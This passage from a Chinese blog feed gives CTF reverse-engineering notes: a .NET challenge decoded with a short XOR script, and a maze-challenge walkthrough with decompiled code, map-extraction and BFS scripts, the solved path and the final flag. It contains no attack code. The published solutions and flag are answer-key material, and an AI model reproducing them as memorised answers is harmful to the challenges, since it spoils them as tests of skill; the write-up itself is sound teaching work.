    <content type="html"><![CDATA[<h1 id="扫雷逆向"><a href="#扫雷逆向" class="headerlink" title="扫雷逆向"></a>扫雷逆向</h1><p><a href="https://blog.csdn.net/datouyu0824/article/details/115042617">扫雷逆向分析-CSDN博客</a></p><h1 id="CE的使用"><a href="#CE的使用" class="headerlink" title="CE的使用"></a>CE的使用</h1><p><a href="https://mod.3dmgame.com/mod/140848">游戏Mod工具 Cheat Engine （CE修改器） 7.5 汉化版 Mod V7.5.0 下载- 3DM Mod站</a></p><p><a href="https://blog.csdn.net/freeking101/article/details/101107489">Cheat Engine 教程（ 1 - 9 通关 ）_cheat engine官网-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Minesweeper"><a href="#Minesweeper" class="headerlink" title="Minesweeper"></a>Minesweeper</h2><blockquote><p>更新: 2024-10-29 10:57:50<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tcz6i4fmfpgba37r">https://www.yuque.com/chaye-apqbl/vsc85q/tcz6i4fmfpgba37r</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/net%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/net%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="net逆向"><a href="#net逆向" class="headerlink" title="net逆向"></a>net逆向</h1><h1 id="ilspy下载地址"><a href="#ilspy下载地址" class="headerlink" title="ilspy下载地址"></a><font style="color:rgb(77, 77, 77);">ilspy下载地址</font></h1><p><a href="https://github.com/icsharpcode/ILSpy/releases">Releases · icsharpcode&#x2F;ILSpy (github.com)</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><img src="/./img/49277317_P-90xMwFJdpak7ep/1726980125001-19c92b60-bd67-4b97-a953-0dbb1b1af9ee-929398.png" alt="1726980125001-19c92b60-bd67-4b97-a953-0dbb1b1af9ee.png"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = [173, 146, 161, 174, 132, 179, 187, 234, 231, 244,<br>     177, 161, 65, 13, 18, 12, 166, 247, 229, 207,<br>     125, 109, 67, 180, 230, 156, 125, 127, 182, 236,<br>     105, 21, 215, 148, 92, 18, 199, 137, 124, 38,<br>     228, 55, 62, 164]<br>x = len(a)<br>b = []<br><br>for i in range(x):<br>    b.append((((a[i] ^ (i * i)) ^ 0x72) - 114)%128)<br>&quot;要使得ascll在0-127内，所以要取余128，否则会输出乱码&quot;<br><br><br>for i in range(x):<br>    print(chr(b[i]), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p>取余前：</p><p><img src="/./img/49277317_P-90xMwFJdpak7ep/1726980749913-f5518d4a-3910-488c-ba48-7ea5f0676f4e-134118.png" alt="1726980749913-f5518d4a-3910-488c-ba48-7ea5f0676f4e.png"></p><p>取余后</p><p><img src="/./img/49277317_P-90xMwFJdpak7ep/1726980735185-097e057f-0c20-4d62-8675-91b90b4b7e11-642628.png" alt="1726980735185-097e057f-0c20-4d62-8675-91b90b4b7e11.png"></p><blockquote><p>更新: 2024-09-22 12:53:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/drw08suvalukk4lg">https://www.yuque.com/chaye-apqbl/vsc85q/drw08suvalukk4lg</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/maze%E8%BF%B7%E5%AE%ABMD5/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/maze%E8%BF%B7%E5%AE%ABMD5/</url>
    
    <content type="html"><![CDATA[<h1 id="maze迷宫MD5"><a href="#maze迷宫MD5" class="headerlink" title="maze迷宫MD5"></a>maze迷宫MD5</h1><p><font style="color:rgb(51, 51, 51);">前言：该篇文章会介绍一个在ctf当中reverse方向中常见的一种迷宫题，我从攻防世界中选取了一道比较有代表性的题目，逐一讲解，并且每个思路都相当清晰透彻，借此分享，相信看完之后对于迷宫类型的题目会有更深的理解。</font></p><h1 id="例题1：攻防世界-reverse-re3"><a href="#例题1：攻防世界-reverse-re3" class="headerlink" title="例题1：攻防世界-reverse_re3"></a><font style="color:rgb(51, 51, 51);">例题1：攻防世界-reverse_re3</font></h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a><font style="color:rgb(51, 51, 51);">第一步</font></h2><p><font style="color:rgb(51, 51, 51);">首先看有无壳，直接丢到exeinfope—发现是elf文件是linux的可执行程序</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234589796-a7e22b5b-307e-4b76-8a29-87319e857a1b-913314.png" alt="1717234589796-a7e22b5b-307e-4b76-8a29-87319e857a1b.png"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><font style="color:rgb(51, 51, 51);">第二步</font></h2><p><font style="color:rgb(51, 51, 51);">反手丢进ida看到main 直接F5反编译看一手</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234604020-6b0ec156-23fb-43fd-a782-8ade83694c45-644909.png" alt="1717234604020-6b0ec156-23fb-43fd-a782-8ade83694c45.png"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a><font style="color:rgb(51, 51, 51);">第三步</font></h2><p><font style="color:rgb(51, 51, 51);">一个一个函数来，sub_11B4双击点开好像没啥东西，看看sub_940</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs plain">__int64 sub_940()<br>&#123;<br>  int v0; // eax<br>  int v2; // [rsp+8h] [rbp-218h]<br>  int v3; // [rsp+Ch] [rbp-214h]<br>  char v4[520]; // [rsp+10h] [rbp-210h] BYREF<br>  unsigned __int64 v5; // [rsp+218h] [rbp-8h]<br><br>  v5 = __readfsqword(0x28u);<br>  v3 = 0;<br>  memset(v4, 0, 0x200uLL);<br>  _isoc99_scanf(&amp;unk_1278, v4, v4);<br>  while ( 1 )<br>  &#123;<br>    do<br>    &#123;<br>      v2 = 0;<br>      sub_86C();<br>      v0 = v4[v3];<br>      if ( v0 == &#x27;d&#x27; )               //原题是ascii码可以对着ascii按&quot;r&quot;快捷键转成字符<br>      &#123;<br>        v2 = sub_E23();<br>      &#125;<br>      else if ( v0 &gt; &#x27;d&#x27; )          //wasd很明显就是游戏里常见的移动键呗<br>      &#123;<br>        if ( v0 == &#x27;s&#x27; )<br>        &#123;<br>          v2 = sub_C5A();<br>        &#125;<br>        else if ( v0 == &#x27;w&#x27; )<br>        &#123;<br>          v2 = sub_A92();<br>        &#125;<br>      &#125;<br>      else<br>      &#123;<br>        if ( v0 == 27 )<br>          return 0xFFFFFFFFLL;<br>        if ( v0 == &#x27;a&#x27; )<br>          v2 = sub_FEC();<br>      &#125;<br>      ++v3;<br>    &#125;<br>    while ( v2 != 1 );<br>    if ( dword_202AB0 == 2 )<br>      break;<br>    ++dword_202AB0;<br>  &#125;<br>  puts(&quot;success! the flag is flag&#123;md5(your input)&#125;&quot;);<br>  return 1LL;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">这里留个心眼，flag是要输入的md5值</font></p><p><font style="color:rgb(51, 51, 51);">接下来分析wasd到底是怎么走的（像这种题大概率就是迷宫图，所以要明白它是怎么运动的）</font></p><p><font style="color:rgb(51, 51, 51);">先打开sub_E23康康</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234684753-fa345f3c-fcd8-4cf2-a622-cf4e4773d23e-625806.png" alt="1717234684753-fa345f3c-fcd8-4cf2-a622-cf4e4773d23e.png"></p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a><font style="color:rgb(51, 51, 51);">第四步</font></h2><p><font style="color:rgb(51, 51, 51);">千万不要给这几个变量绕晕了</font></p><p><font style="color:rgb(51, 51, 51);">dword_202020：其实就是题目给的地图，可以双击进去看看（shift+e 提取数据）</font></p><p><font style="color:rgb(51, 51, 51);">dword_202AB0：代表哪个迷宫，此题有3个迷宫（至于为什么后文会提及）</font></p><p><font style="color:rgb(51, 51, 51);">dword_202AB4：代表行（因为15*，说明可能是一行15个数字，大胆猜测！）</font></p><p><font style="color:rgb(51, 51, 51);">dword_202AB8：代表列</font></p><p><font style="color:rgb(51, 51, 51);">225：地图尺寸15*15</font></p><p><font style="color:rgb(51, 51, 51);">这里我转换了一下不容易混淆</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234697051-8cfd01d3-dad0-4095-9bea-505930fca360-520418.png" alt="1717234697051-8cfd01d3-dad0-4095-9bea-505930fca360.png"></p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a><font style="color:rgb(51, 51, 51);">第五步</font></h2><p><font style="color:rgb(51, 51, 51);">第一个if！&#x3D;14 是因为跟下标有关系，一行15个数字下标最大是14，我们这个函数是”d“的操作也就是向右移，所以是如果下标等于14的话就不能再”d“了<br></font><font style="color:rgb(51, 51, 51);">第二个if 判断当前位置右移的数字是不是1，如果是将该位置标志为3，之前的位置标志为1，其实就是暗示我们1是可以走的，而3其实是我们的起点，如果不理解后面看看迷宫就明白了，<br></font><font style="color:rgb(51, 51, 51);">第三个if如果右移后是4就返回1，说明4就是我们的终点</font></p><p><font style="color:rgb(51, 51, 51);">再看看上下移动的函数（下图是”s“的函数，也就是下移）——有一些题目上下移动不是单纯的往上或者往下 而是斜向下或者斜向上噢</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234791049-81359f85-da1d-49cc-82c9-71c6c429ac94-080754.png" alt="1717234791049-81359f85-da1d-49cc-82c9-71c6c429ac94.png"></p><h2 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a><font style="color:rgb(51, 51, 51);">第六步</font></h2><p><font style="color:rgb(51, 51, 51);">每次加15说明每次加一行</font></p><p><font style="color:rgb(51, 51, 51);">注意：这里分析的是右移”d“和下移”s“的函数至于”w“ ”a“都是差不多的，这里就不过多赘述了</font></p><p><font style="color:rgb(51, 51, 51);">再回到sub_940函数</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234822384-19edaf01-78e6-48f6-b162-16c4d2c4e14a-161276.png" alt="1717234822384-19edaf01-78e6-48f6-b162-16c4d2c4e14a.png"></p><h2 id="第七步"><a href="#第七步" class="headerlink" title="第七步"></a><font style="color:rgb(51, 51, 51);">第七步</font></h2><p><font style="color:rgb(51, 51, 51);">这里的dword_202AB0&#x3D;&#x3D;2 我们在前面提到它可能是标识哪一个迷宫的，这里说&#x3D;&#x3D;2的话就break，否则就++，说明这里会循环3次，说明会有3个迷宫，接下来我们来看看这个稍微的迷宫长什么样。</font></p><p><font style="color:rgb(51, 51, 51);">双击点开前文提到的dword_202020</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717234833866-133d0ab3-eda8-48ac-8230-ec838e7ae849.png"></p><h2 id="第八步"><a href="#第八步" class="headerlink" title="第八步"></a><font style="color:rgb(51, 51, 51);">第八步</font></h2><p><font style="color:rgb(51, 51, 51);">这密密麻麻的数字就是它的数据啦，现在按shift+e提取数据，然后导出来</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234857731-0367cdf8-5cb7-470d-9b2b-5c37400107d3-520779.png" alt="1717234857731-0367cdf8-5cb7-470d-9b2b-5c37400107d3.png"><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">这里有个大大大坑，就是dword类型的数据是4位一组，只取第一位作为数值，也就是说100010000111 最终会变成110 ，后3位是填充的，接下来就是怎么转换成一个迷宫了，网上一堆wp却几乎没有人提到如何去把这份原始数据转换成迷宫，下面我提供了一个python脚本针对这道题目，只要运行即可得到迷宫的样子，</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234880358-f64c4fdd-828a-4744-afa3-70004e33c2d4-745912.png" alt="1717234880358-f64c4fdd-828a-4744-afa3-70004e33c2d4.png"><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">一开始数据是这样的，先利用记事本的功能替换掉 ，和空格 以及前面的括号等等</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234923253-2411cdf6-26ea-44fa-9a59-8bdf81c838cf-433649.png" alt="1717234923253-2411cdf6-26ea-44fa-9a59-8bdf81c838cf.png"><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">之后利用一下py脚本即可完成转换</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 输入需要处理的字符串  <br>input_string = input(&quot;请输入需要处理的字符串：&quot;)  <br><br># 将所有字符连起来，去掉换行符  <br>output_string = input_string.replace(&quot;\n&quot;, &quot;&quot;)  <br>ZeK1D = output_string.replace(&quot; &quot;, &quot;&quot;)    <br><br>def extract_chars(input_string):  <br>    # 将输入字符串分割为每四位  <br>    chunks = [input_string[i:i+4] for i in range(0, len(input_string), 4)]  <br><br>    # 提取每四位中的第一位字符  <br>    first_chars = [chunk[0] for chunk in chunks if chunk]  <br><br>    # 将字符连在一起并输出  <br>    output= &#x27;&#x27;.join(first_chars)  <br>    print(output)  <br><br><br># 调用函数并输出结果  <br>extract_chars(ZeK1D)<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">之后可以将输出结果复制到word 改格式会好看一点</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1717234935670-ff0486b9-6c59-471a-88ef-dc0b0655cf92-084936.png" alt="1717234935670-ff0486b9-6c59-471a-88ef-dc0b0655cf92.png"></p><h2 id="第九步"><a href="#第九步" class="headerlink" title="第九步"></a><font style="color:rgb(51, 51, 51);">第九步</font></h2><p><font style="color:rgb(51, 51, 51);">之后再按每15行为一个迷宫分成3个小迷宫，以3为起点4为终点进行运动，之后再md5加密即可得到flag</font></p><p><font style="color:rgb(51, 51, 51);">第一个迷宫</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">第二个迷宫</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 3, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</font></p><p><font style="color:rgb(51, 51, 51);">第三个迷宫</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]</font></p><p><font style="color:rgb(51, 51, 51);">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</font></p><p><font style="color:rgb(51, 51, 51);">行动轨迹为：ddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddss</font></p><p><font style="color:rgb(51, 51, 51);">经过md5编码后flag是flag{aeea66fcac7fa80ed8f79f38ad5bb953}</font></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><font style="color:rgb(51, 51, 51);">总结：</font></h2><p><font style="color:rgb(51, 51, 51);">逆向遇到迷宫题的思路大概分2点</font></p><p><font style="color:rgb(51, 51, 51);">1.弄清楚移动的方式</font></p><p><font style="color:rgb(51, 51, 51);">2.分析迷宫图的尺寸</font></p><p><font style="color:rgb(51, 51, 51);">3.手动走迷宫或写脚本走迷宫（建议BFS算法）</font></p><h1 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a><font style="color:rgb(51, 51, 51);">例题2</font></h1><p>查壳，放ida</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287542512-fd0e9f66-ad89-4f99-aa08-b3c5fc41d933-455404.png" alt="1721287542512-fd0e9f66-ad89-4f99-aa08-b3c5fc41d933.png"></p><p>注意flag是md5（留个心眼），然后去动态调试找flag，这个createmap非常显眼</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287626134-4c1d02ad-2ed0-48f3-a698-f92236473e44-513169.png" alt="1721287626134-4c1d02ad-2ed0-48f3-a698-f92236473e44.png"></p><p>先下个断点，然后开始调试</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287763212-b4cc0f54-cc4e-41f7-8325-4895a9b743ac-253909.png" alt="1721287763212-b4cc0f54-cc4e-41f7-8325-4895a9b743ac.png"></p><p>任意输入一些，然后去search map</p><p>这里的快捷键有ctrl+T，查找下一个text</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287799865-9ae1bc66-51e5-4083-a47e-0da39777b1ed-194589.png" alt="1721287799865-9ae1bc66-51e5-4083-a47e-0da39777b1ed.png"></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287879466-867a862b-99c2-4249-a32e-c3440b3ba5c8-981061.png" alt="1721287879466-867a862b-99c2-4249-a32e-c3440b3ba5c8.png"></p><p>找到后shift+E提取数据，然后放入我们的脚本文件</p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287938904-da7cd899-3e25-4630-8538-420efe1ccc9f-817581.png" alt="1721287938904-da7cd899-3e25-4630-8538-420efe1ccc9f.png"><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721287963254-d35f1b10-f2d0-4c09-b86f-a9bed5885a19-633624.png" alt="1721287963254-d35f1b10-f2d0-4c09-b86f-a9bed5885a19.png"></p><p><font style="color:rgb(77, 77, 77);">修改脚本中行列参数，运行脚本得到16*16的二维列表</font></p><p><font style="color:rgb(77, 77, 77);">将二维列表复制到【</font><strong><font style="color:rgb(77, 77, 77);">二.（一）</font></strong><font style="color:rgb(77, 77, 77);">】中的</font><strong><font style="color:rgb(77, 77, 77);">&lt;脚本二：获得迷宫路径&gt;</font></strong><font style="color:rgb(77, 77, 77);">中</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721288121231-bcb51aa9-1ef6-4e1c-801f-00a311c1fe8b-011439.png" alt="1721288121231-bcb51aa9-1ef6-4e1c-801f-00a311c1fe8b.png"></p><p><font style="color:rgb(77, 77, 77);"> 分析check()函数得到起点坐标为(15, 1)，且本题未给出确切终点而是在main函数中给出了路径长为54</font></p><p><font style="color:rgb(77, 77, 77);">并且用aswd键位移动</font></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721288538242-b466a9b5-a88a-4108-a8be-e59dfb79cd2d-711029.png" alt="1721288538242-b466a9b5-a88a-4108-a8be-e59dfb79cd2d.png"></p><p><img src="/./img/49277317_bgpB08qunU-1Ty9m/1721288574799-f3796f86-3941-4f3e-933b-fa988c94cb86-902758.png" alt="1721288574799-f3796f86-3941-4f3e-933b-fa988c94cb86.png"></p><p>这里附上最终代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs plain">from collections import deque<br># str为ida中使用快捷键[shift+e]提取到的数据, 如果提取的是string literal则加上引号视作字符串，如果是C array(decimal)则加上中括号视作列表<br>str = [<br><br>    1,   1,   1,   1,   1,   1,   1,   1,   1,   1,<br>    1,   1,   1,   1,   1,   1,   1,   0,   0,   0,<br>    0,   0,   1,   1,   1,   1,   1,   1,   0,   1,<br>    1,   1,   1,   0,   1,   1,   1,   0,   1,   1,<br>    1,   1,   1,   1,   0,   1,   1,   1,   1,   0,<br>    1,   1,   1,   0,   1,   1,   0,   0,   0,   1,<br>    0,   1,   1,   1,   1,   0,   1,   1,   1,   0,<br>    1,   1,   0,   1,   0,   1,   0,   1,   1,   1,<br>    1,   0,   1,   1,   1,   0,   0,   0,   0,   1,<br>    0,   1,   0,   1,   1,   1,   1,   0,   1,   1,<br>    1,   1,   1,   1,   0,   1,   0,   1,   0,   1,<br>    1,   1,   1,   0,   1,   1,   1,   1,   1,   1,<br>    0,   0,   0,   1,   0,   1,   1,   1,   1,   0,<br>    1,   1,   1,   1,   1,   1,   1,   0,   1,   1,<br>    0,   1,   1,   1,   1,   0,   1,   1,   1,   1,<br>    1,   1,   1,   0,   